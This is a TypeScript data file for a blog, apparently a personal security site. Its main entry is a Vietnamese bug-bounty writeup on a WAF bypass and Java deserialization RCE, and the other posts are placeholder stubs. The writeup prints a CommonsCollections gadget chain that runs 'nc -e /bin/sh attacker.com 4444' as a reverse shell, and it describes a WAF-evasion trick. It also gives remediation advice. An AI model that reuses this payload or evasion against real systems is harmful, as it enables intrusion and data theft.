import { BASE } from '../../site.config.mjs';

export interface Post {
  slug: string;
  title: string;
  date: string;
  category: 'AEROSPACE' | 'REVERSE-ENG' | 'CTF-WRITEUP' | 'POST-QUANTUM' | 'CYBERSECURITY';
  readTime: string;
  summary: string;
  tags: string[];
  classification: 'TOP-SECRET' | 'RESTRICTED' | 'UNCLASSIFIED';
  content: string;
}

export const POSTS: Post[] = [
  {
    slug: 'waf-bypass-rce-zero-day',
    title: 'Zero-Day Writeup: Bypass WAF & RCE qua Insecure Deserialization trên Hệ Thống Quản Trị',
    date: '2026-10-06',
    category: 'REVERSE-ENG',
    readTime: '22 MIN READ',
    classification: 'RESTRICTED',
    tags: ['BUG-BOUNTY', 'RCE', 'WAF-BYPASS', 'DESERIALIZATION', 'PENTEST'],
    summary: 'Báo cáo chi tiết quá trình phát hiện và khai thác chuỗi lỗ hổng zero-day từ việc bypass Web Application Firewall đến thực thi mã từ xa (RCE) trên hệ thống lõi.',
    content: `
<h2 class="accent" style="margin-top: 1rem; font-size: 1.5em; letter-spacing: 0.1em;">[+] 01 // VULNERABILITY OVERVIEW</h2>
<p>Trong quá trình tham gia một chương trình Private Bug Bounty cho một tập đoàn tài chính lớn, đội ngũ <b>LOGKISM</b> đã phát hiện ra một chuỗi lỗ hổng cực kỳ nghiêm trọng. Kẻ tấn công có thể bypass hệ thống WAF (Web Application Firewall) lớp ngoài và khai thác lỗ hổng <b>Insecure Deserialization</b> bên trong ứng dụng Java Spring Boot để đạt được Remote Code Execution (RCE).</p>

<img src="${BASE}images/waf_poc.jpg" alt="WAF Block Graph" style="width: 100%; height: auto; border: 1px solid var(--line-accent); margin: 1.5rem 0; box-shadow: 0 0 20px var(--glow);" />
<em style="color: var(--muted); font-size: 0.85em; display: block; text-align: center; margin-top: -1rem; margin-bottom: 2rem;">Hình 1: Đồ thị lưu lượng mạng bị WAF block (Tái hiện).</em>

<h2 class="accent" style="margin-top: 2rem; font-size: 1.5em; letter-spacing: 0.1em;">[+] 02 // RECONNAISSANCE & WAF BYPASS</h2>
<p>Bề mặt tấn công ban đầu là một endpoint API nội bộ bị lộ ra ngoài internet do lỗi cấu hình Nginx proxy:</p>

<pre style="background: rgba(13, 13, 17, 0.9); padding: 1rem; border-left: 2px solid var(--accent); margin: 1rem 0; overflow-x: auto; font-size: 0.9em; line-height: 1.4;"><code>GET /api/v1/internal/admin/sync HTTP/1.1
Host: api.redacted.com
X-Forwarded-For: 127.0.0.1</code></pre>

<p>Hệ thống WAF chặn các payload thông thường như ngoặc kép (<code>"</code>), lệnh shell (<code>/bin/bash</code>), và các chuỗi serialized base64 đặc trưng của Java (<code>rO0AB...</code>). Tuy nhiên, WAF lại bỏ qua việc kiểm tra payload nếu Header <code>Content-Encoding: chunked</code> được sử dụng kèm với những ký tự null byte (<code>%00</code>) nằm trước phần thân HTTP request.</p>

<h2 class="accent" style="margin-top: 2rem; font-size: 1.5em; letter-spacing: 0.1em;">[+] 03 // EXPLOITING INSECURE DESERIALIZATION (RCE)</h2>
<p>Sau khi gửi được payload nguyên vẹn đến backend, bước tiếp theo là tạo gadget chain khai thác thư viện CommonsCollections bị lỗi của backend.</p>
<p>Thay vì sử dụng Ysoserial truyền thống, chúng tôi phải custom lại một Gadget chain bằng cách sử dụng class <code>BadAttributeValueExpException</code> kết hợp với <code>TiedMapEntry</code> để trigger hàm <code>getValue()</code>, từ đó thực thi mã thông qua <code>Runtime.exec()</code>.</p>

<pre style="background: rgba(13, 13, 17, 0.9); padding: 1rem; border-left: 2px solid var(--accent); margin: 1rem 0; overflow-x: auto; font-size: 0.9em; line-height: 1.4;"><code class="language-java">// Gadget Chain Triggers
Transformer[] transformers = new Transformer[] {
    new ConstantTransformer(Runtime.class),
    new InvokerTransformer("getMethod", new Class[] { String.class, Class[].class }, new Object[] { "getRuntime", new Class[0] }),
    new InvokerTransformer("invoke", new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }),
    new InvokerTransformer("exec", new Class[] { String.class }, new Object[] { "nc -e /bin/sh attacker.com 4444" })
};</code></pre>

<h2 class="accent" style="margin-top: 2rem; font-size: 1.5em; letter-spacing: 0.1em;">[+] 04 // PROOF OF CONCEPT & IMPACT</h2>
<p>Khi gửi payload đã mã hoá, backend tiến hành deserialize đối tượng và thực thi lệnh netcat, trả về một Reverse Shell với quyền <code>root</code> trên container Docker.</p>

<blockquote style="border-left: 3px solid var(--ok); padding-left: 1rem; margin: 1.5rem 0; color: var(--fg); background: rgba(31, 122, 77, 0.1); padding: 1rem;">
  <b>IMPACT:</b> Kẻ tấn công có toàn quyền kiểm soát microservice của backend, có thể trích xuất biến môi trường chứa Secret Keys của AWS S3 và rò rỉ dữ liệu nhạy cảm của khách hàng. Điểm CVSS tính toán: <b>9.8 (CRITICAL)</b>.
</blockquote>

<h2 class="accent" style="margin-top: 2rem; font-size: 1.5em; letter-spacing: 0.1em;">[+] 05 // REMEDIATION</h2>
<p>Chúng tôi đã khuyến nghị đội ngũ bảo mật của tập đoàn áp dụng các bản vá ngay lập tức:</p>
<ul style="margin-left: 1.5rem; margin-top: 1rem; margin-bottom: 2rem; line-height: 1.8;">
  <li>Ngừng sử dụng serialization của Java, thay bằng JSON (Jackson/Gson) với cơ chế kiểm tra kiểu dữ liệu an toàn.</li>
  <li>Cấu hình lại Nginx Ingress Controller để drop triệt để các kết nối trực tiếp vào endpoint <code>/internal/*</code>.</li>
  <li>Cập nhật rule WAF để chống lại các kỹ thuật Evasion như Chunked Encoding Abuse.</li>
</ul>
`
  },
  {
    slug: 'aero-telemetry-analysis',
    title: 'Deep Space Network: Decoding Voyager 1 Telemetry Data',
    date: '2026-09-12',
    category: 'AEROSPACE',
    readTime: '15 MIN READ',
    classification: 'UNCLASSIFIED',
    tags: ['DSN', 'TELEMETRY', 'RF', 'VOYAGER'],
    summary: 'A deep dive into decoding the raw telemetry frames received from Voyager 1 using software-defined radio and custom demodulation scripts.',
    content: '<p>Sample content for Aerospace article 1...</p>'
  },
  {
    slug: 'aero-orbital-mechanics',
    title: 'Orbital Mechanics: Simulating LEO Satellite Trajectories',
    date: '2026-08-04',
    category: 'AEROSPACE',
    readTime: '18 MIN READ',
    classification: 'UNCLASSIFIED',
    tags: ['ORBITAL', 'SIMULATION', 'LEO'],
    summary: 'Building a Python-based simulation engine for Low Earth Orbit satellite trajectories accounting for atmospheric drag.',
    content: '<p>Sample content for Aerospace article 2...</p>'
  },
  {
    slug: 'cyber-kernel-exploitation',
    title: 'Windows Kernel Exploitation: HEVD Stack Overflow',
    date: '2026-07-22',
    category: 'CYBERSECURITY',
    readTime: '25 MIN READ',
    classification: 'UNCLASSIFIED',
    tags: ['KERNEL', 'EXPLOIT', 'WINDOWS', 'HEVD'],
    summary: 'Step-by-step walkthrough of exploiting a stack buffer overflow in the HackSys Extreme Vulnerable Driver to achieve SYSTEM privileges.',
    content: '<p>Sample content for Cybersecurity article 1...</p>'
  },
  {
    slug: 'cyber-active-directory',
    title: 'Active Directory: Abusing Resource-Based Constrained Delegation',
    date: '2026-06-15',
    category: 'CYBERSECURITY',
    readTime: '12 MIN READ',
    classification: 'UNCLASSIFIED',
    tags: ['AD', 'RBCD', 'RED-TEAM'],
    summary: 'Understanding and exploiting Resource-Based Constrained Delegation (RBCD) to compromise computer accounts in an Active Directory environment.',
    content: '<p>Sample content for Cybersecurity article 2...</p>'
  }
];
